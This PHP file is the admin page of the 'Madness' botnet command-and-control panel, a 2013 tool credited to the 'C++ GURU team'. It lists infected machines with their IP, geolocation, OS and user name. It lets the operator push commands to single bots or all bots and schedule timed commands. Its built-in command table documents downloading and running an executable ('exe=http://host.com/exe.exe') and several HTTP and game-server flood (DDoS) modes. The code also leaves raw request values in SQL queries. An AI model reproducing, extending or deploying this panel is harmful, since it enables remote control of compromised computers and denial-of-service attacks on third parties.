<?php
define("FILE", true);
$tstart = array_sum(explode(" ", microtime()));
include("../inc/config.php");

if ($conf['auth']) {
	if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) authenticate();
	if (!(($_SERVER['PHP_AUTH_USER'] == $conf['adname']) && ($_SERVER['PHP_AUTH_PW'] == $conf['adpass']))) authenticate();
	function authenticate() {
		header('WWW-Authenticate: Basic realm="Optima"');
		header('HTTP/1.0 401 Unauthorized');
		die("Wrong password!");
	}
}

include("../inc/functions.php");
include("../inc/lang.php");
include("functions.php");

@session_start();

if (!$_SESSION['sess_type'] || $_GET['logout'] == 1) {
	@session_destroy();
	header("Location: ");
	exit;
}

mysql_connect($conf['dbhost'], $conf['dbuser'], $conf['dbpass']) || die("Database connection failed! Fix login and password in config.php");
mysql_select_db($conf['dbname']);

if ($_SESSION['alang'] != "") {
	$conf['lang'] = $_SESSION['alang'];
} else {
	$_SESSION['alang'] = $conf['lang'];
}

function bots() {
	global $conf, $lang, $timeout;
	head();
	if ($_SESSION['sess_type'] == md5($conf['adpass'])) {
		echo "<p><fieldset><legend>".$lang[$conf['lang']]['main_command_replace']."</legend>";
		$dir = "../inc/config.php";
		$pdir = decoct(fileperms($dir));
		$per = substr($pdir, -3);
		if ($per != "666") {
			echo "<b>inc/config.php ".$lang[$conf['lang']]['perm']." CHMOD 666</b>";
		} else {
			echo "<form id=\"form1\" name=\"form1\" method=\"post\" action=\"index.php?op=addall\"><input size=\"160\" type=\"text\" name=\"command\" class=\"m1\"> <input type=\"submit\" name=\"submit\" value=\"".$lang[$conf['lang']]['button_save']."\" class=\"cssbutton\"></form>";
		}
		echo "</fieldset><p></center>";
	}
	
	$page = isset($_GET['page']) ? intval($_GET['page']) : "1";
	$offset = ($page-1) * $conf['pages'];
	$offset = intval($offset);
	
	$query = mysql_query("SELECT COUNT(id) AS count FROM bots WHERE last_online > $timeout;");
	list($count) = mysql_fetch_array($query);
	$pages = ceil($count / $conf['pages']);

	if ($count) {
	
	if ($page == "all") {
		$query = mysql_query("SELECT last_ip, id, last_online, new, version, OS, user,command, regdate FROM bots WHERE last_online > '$timeout' ORDER BY regdate DESC");
	} else {
		$query = mysql_query("SELECT last_ip, id, last_online, new, version, OS, user,command, regdate FROM bots WHERE last_online > '$timeout' ORDER BY regdate DESC LIMIT ".$offset.", ".$conf['pages']."");
	}
	
	echo "<div align=\"center\"><table width=\"90%\" border=\"0\" cellpadding=\"0\" cellspacing=\"1\" bgcolor=\"#ffffff\" class=\"sort\" id=\"sort_id\">
	<tr class=\"list\">
	<th>".$lang[$conf['lang']]['table_last_addr']."</th>
	<th>".$lang[$conf['lang']]['table_regdate']."</th>
	<th>".$lang[$conf['lang']]['table_id']."</th>
	<th>".$lang[$conf['lang']]['table_version']."</th>
    <th>".$lang[$conf['lang']]['table_OS']."</th>
    <th>".$lang[$conf['lang']]['table_User']."</th>
	<th>".$lang[$conf['lang']]['table_synch']."</th>
	<th>".$lang[$conf['lang']]['table_command']."</th>
	<th>".$lang[$conf['lang']]['table_command']."</th>
	</tr>";
	
	while($result = mysql_fetch_array($query)) {
		$ips[] = $result['last_ip'];
		echo "<tr bgcolor=\"#010101\" onmouseover=\"bgColor='#202020'\" onmouseout=\"bgColor='#010101'\">
		<td style=\"padding: 0px 0px 0px 3px;\">".user_geo_ip($result['last_ip'], 4)."</td>
		<td align=\"center\">".$result['regdate']."</td>
		<td align=\"center\">".strip_tags($result['id'])."</td>
		<td align=\"center\">".strip_tags($result['version'])."</td>
        <td align=\"center\">".strip_tags($result['OS'])."</td>
        <td align=\"center\">".strip_tags($result['user'])."</td>
		<td align=\"center\">".strip_tags(make_synch($result['last_online']))./*date("d.m.Y H:i", $result['last_online'])*/"</td>
		<td align=\"center\">";
		$out_command = ($result['command']) ? base64_decode($result['command']) : base64_decode(get_command());
		if (strlen($out_command) > 35) $out_command = substr($out_command, 0, 35)."...";
		echo $out_command."</td>"
		."<td align=\"center\"><a href=\"#\" onclick=\"set_status('".$result['id']."');\">".$lang[$conf['lang']]['button_add']."</a></td></tr>";
	}
	echo "</table></div><div class=\"navigation\" align=\"center\" style=\"margin-bottom:10px; margin-top:10px;\">";

	if ($page != "all") {
		num_pages($pages, "");
	} else {
		echo "<textarea cols=\"150\" rows=\"10\" style=\"width: 90%\">".implode(",", $ips)."</textarea>";
	}
} 
	foot();
}

function timebots() {
	global $conf, $lang, $timeout;
	head();
	$fieldc = explode("||", $conf['timecmd']);
	for ($c = 0; $c < $conf['time']; $c++) {
		$out= explode("|", $fieldc[$c]);
		$tcmd = base64_decode($out[2]);
		
		$time1 = (!$tcmd) ? time() : $out[0];
		$time2 = (!$tcmd) ? time() : $out[1];
		
		$b = $c + 1;
		$display = ($out[1] == "0" && $out[0][$c] != "0") ? "style=\"display: none;\"" : "";
		$content .= "<div id=\"fi".$c."\" ".$display.">"
		."<table width=\"95%\" border=\"0\" cellspacing=\"0\" cellpadding=\"1\"><tr><td><div id=\"fi".$b."-title\" title=\"".$lang[$conf['lang']]['add']."\"><img src=\"img/add.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['add']."\" title=\"".$lang[$conf['lang']]['add']."\"></div></td>"
		."<td>".$lang[$conf['lang']]['start'].": ".datetime(1, "field1".$c, date("Y-m-d H:i", $time1), 16, 60, 110, "m1")."</td>"
		."<td>".$lang[$conf['lang']]['end'].": ".datetime(1, "field2".$c, date("Y-m-d H:i", $time2), 16, 60, 110, "m1")."</td>"
		."<td>".$lang[$conf['lang']]['button_add'].": <input type=\"text\" name=\"field3".$c."\" value=\"".$tcmd."\" size=\"50\" style=\"width: 500px\" class=\"m1\"></td></tr></table></div>"
		."<script language=\"JavaScript\" type=\"text/javascript\">var admf = new SwitchCont('fi".$c."', '');</script>";
	}
	$button = ($_SESSION['sess_type'] == md5($conf['adpass'])) ? "<input type=\"submit\" value=\"".$lang[$conf['lang']]['button_save']."\" class=\"cssbutton\">" : "";
	echo "<p><fieldset><legend>".$lang[$conf['lang']]['button_time']."</legend><div align=\"center\"><form action=\"index.php?op=timebotssave\" method=\"post\">".$content."<p>".$button."</form></fieldset>";
	foot();
}

function oldbots() {
	global $conf, $lang, $timeout;
	head();
	echo "<p><fieldset><legend>".$lang[$conf['lang']]['delold']."</legend>"
	."<form id=\"form1\" name=\"form1\" method=\"post\" action=\"index.php?op=delbots\">".$lang[$conf['lang']]['deloldday'].": <input size=\"100\" type=\"text\" name=\"days\" class=\"m1\" /> <input type=\"submit\" value=\"".$lang[$conf['lang']]['button_del']."\" class=\"cssbutton\"></form>"
	."</fieldset><p></center>";
	
	$page = isset($_GET['page']) ? intval($_GET['page']) : "1";
	$offset = ($page-1) * $conf['pages'];
	$offset = intval($offset);
	
	$query = mysql_query("SELECT COUNT(id) AS count FROM bots WHERE last_online < $timeout;");
	list($count) = mysql_fetch_array($query);
	$pages = ceil($count / $conf['pages']);
	
	if ($count) {
		if ($page == "all") {
			$query = mysql_query("SELECT last_ip, id, last_online, new, version, command, OS, user, regdate FROM bots WHERE last_online < '$timeout' ORDER BY last_online DESC");
		} else {
			$query = mysql_query("SELECT last_ip, id, last_online, new, version, command, OS, user, regdate FROM bots WHERE last_online < '$timeout' ORDER BY last_online DESC LIMIT ".$offset.", ".$conf['pages']."");
		}
		
		echo "<div align=\"center\">
		<table width=\"90%\" border=\"0\" cellpadding=\"0\" cellspacing=\"1\" bgcolor=\"#ffffff\" class=\"sort\" id=\"sort_id\">
		<tr class=\"list\">
		<th>".$lang[$conf['lang']]['table_last_addr']."</th>
		<th>".$lang[$conf['lang']]['table_regdate']."</th>
		<th>".$lang[$conf['lang']]['table_id']."</th>
		<th>".$lang[$conf['lang']]['table_version']."</th>
        <th>".$lang[$conf['lang']]['table_OS']."</th>
        <th>".$lang[$conf['lang']]['table_User']."</th>
		<th>".$lang[$conf['lang']]['table_synch']."</th>
		<th>".$lang[$conf['lang']]['table_command']."</th>
		</tr>";
	
		while($result = mysql_fetch_array($query)) {
			echo "<tr bgcolor=\"#010101\" onmouseover=\"bgColor='#202020'\" onmouseout=\"bgColor='#010101'\">
			<td style=\"padding: 0px 0px 0px 3px;\">".user_geo_ip($result['last_ip'], 4)."</td>
			<td align=\"center\">".$result['regdate']."</td>
			<td align=\"center\">".strip_tags($result['id'])."</td>
			<td align=\"center\">".strip_tags($result['version'])."</td>
            <td align=\"center\">".strip_tags($result['OS'])."</td>
            <td align=\"center\">".strip_tags($result['user'])."</td>
			<td align=\"center\">".strip_tags(make_synch($result['last_online']))./*date("d.m.Y H:i", $result['last_online'])*/"</td>
			<td align=\"center\"><a href=\"#\" onclick=\"set_status('".$result['id']."');\">".$lang[$conf['lang']]['button_add']."</a></td></tr>";
		}
		echo "</table></div><div class=\"navigation\" align=\"center\" style=\"margin-bottom:10px; margin-top:10px;\">";
		num_pages($pages, "oldbots");
	}
	foot();
}

function head() {
	global $lang, $conf, $tstart, $timeout;
	$stat = make_stat_simp();
	$last_cmd = get_command();
	
	$last_cmd_decoded = base64_decode($last_cmd);
	$last_cmd_shorty = substr($last_cmd_decoded, 0, 30)."...";
	$last_cmd_clear = str_replace(array("dd1=", "dd2=", "http://"), "", $last_cmd_decoded);

	$timeout = make_timeout();
	
	if ($last_cmd == "d3Rm") {
		$used = "0";
	} else {
		$query = mysql_query("SELECT COUNT(id) AS used FROM bots WHERE new = '0' AND last_online > '$timeout' AND new = 0 LIMIT 1");
		list($used) = mysql_fetch_array($query);
	}
	$stat[0] = intval($stat[1]) - intval($used);
	if ($stat[0] < 0) $stat[0] = 0;
	
	echo "<html>
	<head>
	<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">
	<title>Admin System</title>
	<link rel=\"stylesheet\" type=\"text/css\" href=\"css/style.css\">
	<script type=\"text/javascript\" src=\"ajax/global_func.js\"></script>
	<script>
		function set_status(id){
			var nameData = null;
			nameData = prompt (\"".$lang[$conf['lang']]['js_set_status_enter'].":\", \"\" );
			if (nameData) {
 				var http = new XMLHttpRequest();
				var url = \"index.php?op=addsing\";
				var params = \"uid=\"+id+\"&command=\"+nameData;
				http.open(\"POST\", url, true);
				http.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");
				http.setRequestHeader(\"Content-length\", params.length);
				http.setRequestHeader(\"Connection\", \"close\");
				http.send(params);
				alert(\"".$lang[$conf['lang']]['js_set_status_saved']."\");
				window.location=\"index.php\";
			}
		}
		
		function switchcmd(obj) {
			linkValues=['".$last_cmd_shorty."', '".$last_cmd_decoded."'];
			if (obj.innerHTML == linkValues[0]) {
				obj.innerHTML = linkValues[1];
			} else {
				obj.innerHTML = linkValues[0];
			}
		}
	</script>
	</head>

	<body>
	<center>
	<table border=\"0\" width=\"90%\" cellspacing=\"0\" cellpadding=\"2\" id=\"table1\">
	
	<tr><td width=\"128\" rowspan=\"2\"><img border=\"0\" src=\"img/madness.png\" width=\"175\" height=\"140\"></td>
	
	<td width=\"50%\" rowspan=\"2\" valign=\"top\">
	
	<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"1\" class=\"list\" bgcolor=\"#ffffff\" id=\"table2\">
		<tr><td width=\"45%\" class=\"left\">&nbsp;".$lang[$conf['lang']]['server_time'].":</td><td class=\"right\">".date("d.m.Y ")." ".date("H:i:s")."</td></tr>
		<tr><td class=\"left\">&nbsp;".$lang[$conf['lang']]['bot_count'].":</td><td class=\"right\">".$stat[2]."</td></tr>
		<tr><td class=\"left\">&nbsp;".$lang[$conf['lang']]['bot_count_online'].":</td><td class=\"right\">".$stat[1]."</td></tr>
		<tr><td class=\"left\">&nbsp;".$lang[$conf['lang']]['bot_count_free'].":</td><td class=\"right\">".$stat[0]."</td></tr>
		<tr><td class=\"left\">&nbsp;".$lang[$conf['lang']]['doing'].":</td><td class=\"right\">".$used."</td></tr>
		<tr><td class=\"left\">&nbsp;".$lang[$conf['lang']]['last_cmd'].":</td><td class=\"right\"><a href=\"#\" onclick=\"switchcmd(this);\">".$last_cmd_shorty."</a></td></tr>
        <tr><td class=\"left\">&nbsp;tot=10</td><td align=\"center\" class=\"right\">".$lang[$conf['lang']]['command_tot']."</td></tr>
        <tr><td class=\"left\">&nbsp;</td><td align=\"left\" class=\"right\">&nbsp;</td></tr>
		<tr><td class=\"left\">&nbsp;".$lang[$conf['lang']]['version_panel'].":</td><td class=\"right\">".$conf['version']."</td></tr>
		</table>
        
	</td>
    <td>
    &nbsp;
    </td>
    <td width=\"50%\" valign=\"top\">
    
	<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"1\" class=\"list\" bgcolor=\"#ffffff\" id=\"table5\">
		<tr><td width=\"45%\" class=\"left\">&nbsp;exe=http://host.com/exe.exe</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_exe']."</td></tr>
		<tr><td class=\"left\"> &nbsp;dd1=http://host.com/script.php</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_dd1']."</td></tr>
		<tr><td class=\"left\"> &nbsp;dd2=http://host.com/script.php@@@post_data</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_dd2']."</td></tr>
		<tr><td class=\"left\"> &nbsp;dd3=http://host.com/script.php</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_dd3']."</td></tr>
        
        <tr><td class=\"left\"> &nbsp;dd4=http://host.com/script.php@@@post_data</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_dd4']."</td></tr>
        <tr><td class=\"left\"> &nbsp;dd5=http://host.com</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_dd5']."</td></tr>
        <tr><td class=\"left\"> &nbsp;dd6=http://host.com:27015@@@flud_text</td><td align=\"left\" class=\"right\"> ".$lang[$conf['lang']]['command_dd6']."</td></tr>
        <tr><td class=\"left\"> &nbsp;dd7=http://host.com/script.php</td><td align=\"left\" class=\"right\">".$lang[$conf['lang']]['command_dd7']."</td></tr>

		
		<!--<tr><td class=\"left\">vot=http://host.com/vote.php</td><td align=\"left\" class=\"right\">".$lang[$conf['lang']]['command_vot']."</td></tr>-->

		<tr><td class=\"left\">&nbsp;wtf</td><td align=\"left\" class=\"right\">".$lang[$conf['lang']]['command_wtf']."</td></tr>
	</table>
	</td></tr></table>

		<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" id=\"table1\"><tr>
		<td><div class=\"navigation\" style=\"margin-bottom: 3px; margin-top:10px;\"><a href = \"index.php\">".$lang[$conf['lang']]['button_refresh']."</a></div></td>
		<td><div class=\"navigation\" style=\"margin-bottom: 3px; margin-top:10px;\"><a href = \"index.php?op=timebots\">".$lang[$conf['lang']]['button_time']."</a></div></td>
		<td><div class=\"navigation\" style=\"margin-bottom: 3px; margin-top:10px;\"><a href = \"index.php?op=oldbots\">".$lang[$conf['lang']]['old']."</a></div></td>
		<td><div class=\"navigation\" style=\"margin-bottom: 3px; margin-top:10px;\"><a href = \"index.php?page=all\">".$lang[$conf['lang']]['button_all']."</a></div></td>
		<td><div class=\"navigation\" style=\"margin-bottom: 3px; margin-top:10px;\"><a href = \"index.php?logout=1\">".$lang[$conf['lang']]['button_logout']."</a></div></td>


		</tr></table>";
}

function foot() {
	global $lang, $conf, $tstart;
	echo "</div><p align=\"center\">";
	$totaltime = array_sum(explode(" ", microtime())) - $tstart;
	printf ($lang[$conf['lang']]['script_exec_time'], $totaltime);
	echo "</p></body></html>";
}

function num_pages($pnum, $op) {
	$pag = isset($_GET['page']) ? intval($_GET['page']) : "1";
	$mnum = ($pnum <= 25) ? 25 : ($pnum / 5);
	$nnum = $mnum + 1;
	if ($pnum > 1) {
		$op = ($op) ? "op=".$op."&" : "";
		$content = "";
		if ($pag > 1) {
			$prevpage = $pag - 1;
			$content .= "<a href=\"index.php?".$op."page=$prevpage\" title=\"&lt;&lt;\">&lt;&lt;</a> ";
		}
		for ($i = 1; $i < $pnum+1; $i++) {
			if ($i == $pag) {
				$content .= "<span title=\"$i\">$i</span>";
			} else {
				if ((($i > ($pag - $mnum)) && ($i < ($pag + $mnum))) || ($i == $pnum) || ($i == 1)) $content .= "<a href=\"index.php?".$op."page=$i\" title=\"$i\">$i</a>";
			}
			if ($i < $pnum) {
				if (($i > ($pag - $nnum)) && ($i < ($pag + $mnum))) $content .= " ";
				if (($pag > $nnum) && ($i == 1)) $content .= " <span>...</span>";
				if (($pag < ($pnum - $mnum)) && ($i == ($pnum - 1))) $content .= "<span>...</span> ";
			}
		}
		if ($pag < $pnum) {
			$nextpage = $pag + 1;
			$content .= " <a href=\"index.php?".$op."page=$nextpage\" title=\"&gt;&gt;\">&gt;&gt;</a>";
		}
		echo $content;
	}
}

$op = (isset($_POST['op'])) ? ((isset($_POST['op'])) ? $_POST['op'] : "") : ((isset($_GET['op'])) ? $_GET['op'] : "");
switch($op) {
	default:
	bots();
	break;
	
	case "addsing":
	if (($_SESSION['sess_type'] == md5($conf['adpass'])) && $_POST['uid'] && $_POST['command']) {
		$command = ($_POST['command'] == "nocmd") ? 0 : $_POST['command'];
		$bot_id = $_POST['uid'];
		if (!$command) {
			mysql_query("UPDATE bots SET command = '', new = '0' WHERE id = '$bot_id' LIMIT 1");
		} else {
			$command = base64_encode($command);
			mysql_query("UPDATE bots SET command = '$command', new = '1' WHERE id = '$bot_id' LIMIT 1");
		}
	}
	header("Location: index.php");
	break;
	
	case "addall":
	if (($_SESSION['sess_type'] == md5($conf['adpass'])) && $_POST['command'] != "") {
		mysql_query("UPDATE bots SET new = '1'");
		$command = base64_encode($_POST['command']);
		$content = file_get_contents("../inc/config.php");
		$content = str_replace("\$conf['command'] = \"".$conf['command']."\";", "\$conf['command'] = \"".$command."\";", $content);
		save_conf("../inc/config.php", $content, 1);
	}
	header("Location: index.php");
	break;

	case "timebots":
	timebots();
	break;
	
	case "timebotssave":
	if ($_SESSION['sess_type'] == md5($conf['adpass'])) {
		$field1 = $field2 = $field3 = "0";
		$fields = "";
		for ($i = 0; $i < $conf['time']; $i++) {
			$ident = ($i == 0) ? "" : "||";
			$field3 = base64_encode($_POST['field3'.$i]);
			if ($field3) {
				$field1 = format_time($_POST['field1'.$i].":00");
				$field2 = format_time($_POST['field2'.$i].":00");
			} else {
				$field1 = $field2 = $field3 = "0";
			}
			$fields .= $ident."".$field1."|".$field2."|".$field3;
		}
		$content = file_get_contents("../inc/config.php");
		$content = str_replace("\$conf['timecmd'] = \"".$conf['timecmd']."\";", "\$conf['timecmd'] = \"".$fields."\";", $content);
		save_conf("../inc/config.php", $content, 1);
	}
	header("Location: index.php?op=timebots");
	break;
	
	case "oldbots":
	oldbots();
	break;
	
	case "delbots":
	if ($_SESSION['sess_type'] == md5($conf['adpass'])) {
		$days = (isset($_POST['days'])) ? intval($_POST['days']) : 0;
		if ($days) {
			$deltime = time() - ($days * 86400);
			mysql_query("DELETE FROM bots WHERE last_online < '".$deltime."'");
		}
	}
	header("Location: index.php?op=oldbots");
	break;



	
	case "news_conf":
	news_conf();
	break;
	
	case "news_conf_save":
	news_conf_save();
	break;
}

?>
<p align="center"></p><p align="center">Madness system &amp; Madness control panel � 2013 by C++ GURU team, based on sw^team product 2009-2013</p>